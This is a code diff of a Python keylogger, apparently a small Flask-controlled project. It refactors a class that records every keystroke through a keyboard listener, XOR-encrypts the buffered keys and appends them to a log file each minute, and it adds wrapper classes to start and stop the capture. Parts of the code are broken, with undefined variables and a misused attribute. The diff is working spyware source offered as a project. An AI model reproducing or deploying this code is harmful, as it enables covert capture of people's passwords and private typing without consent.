@@ -29,44 +29,64 @@ def process(value):
     return "KeyLogger started listening", 200
 
 
-@app.route('/time_to_run', methods=['GET'])
 class KeyLogger:
-    def __init__(self, run_time):
-        self.run_time = run_time
+    def __init__(self, routing: str = 'file'):
+        self.routing = routing
         self.current_keys = []
         self.lock = threading.Lock()
+        self.listener = None
+        self.stop = False
+
+    def start(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
+        while not self.stop:
+            time.sleep(60)
+            self.save_and_clear()
 
     def on_press(self, key):
         with self.lock:
             try:
-                # טיפול במקשים מיוחדים ומקשים רגילים
                 if hasattr(key, 'char') and key.char is not None:
                     self.current_keys.append(key.char)
                 else:
                     self.current_keys.append(str(key).replace("Key.", ""))
             except Exception as e:
-                print(f"שגיאה: {e}")
+                print(f"Error: {e}")
 
-    def stop_after_time(self):
-        for _ in range(self.run_time):
-            time.sleep(60)  # המתנה דקה
+    def save_and_clear(self):
+        with self.lock:
+            keys_copy = self.current_keys.copy()
+            self.current_keys.clear()
+        if keys_copy:
+            Writer().add_writing(keys_copy)
 
-            # איסוף והעברת הנתונים להצפנה
-            with self.lock:
-                keys_copy = self.current_keys.copy()
-                self.current_keys.clear()
+    def stop_after_time(self, run_time: int):
+        for _ in range(run_time):
+            time.sleep(60)
+            self.save_and_clear()
+        self.listener.stop()
 
-            log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-            keys_str = ",".join(keys_copy)
-            encrypted_str = EncryptorDecryptor.encrypt(keys_str)
+    def stop_listen(self):
+        self.listener.stop()
+        self.save_and_clear()
+        self.stop = True
 
-            # כתיבה לקובץ
+    def routing_to_save(self, route):
+        if self.routing == 'file':
             with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
                 f.write(f"[{log_time}] {encrypted_str}\n")
 
-        self.listener.stop()
+
+class Writer:
+    @classmethod
+    def add_writing(cls, content):
+        log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
+        keys_str = ",".join(content)
+        encrypted_str = EncryptorDecryptor.encrypt(keys_str)
+
+        with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
+            f.write(f"[{log_time}] {encrypted_str}\n")
 
 
 class EncryptorDecryptor:
@@ -107,6 +127,23 @@ class EncryptorDecryptor:
                 decrypted = bytes([encrypted_data[i] ^ cls.key[i % len(cls.key)] for i in range(len(encrypted_data))])
                 decrypted_str = decrypted.decode('utf-8', errors='replace')
                 print(f"{line[:timestamp_end + 1]} {decrypted_str}")
+
+
+class Manger:
+    def __init__(self):
+        self.key_loger = KeyLogger()
+
+    def start(self):
+        self.key_loger.start()
+
+    def stop(self):
+        self.key_loger.stop_listen()
+
+    def run_time(self):
+        pass
+
+    def route(self, routing='file'):
+        self.key_loger.routing(routing)
 
 
 if __name__ == '__main__':
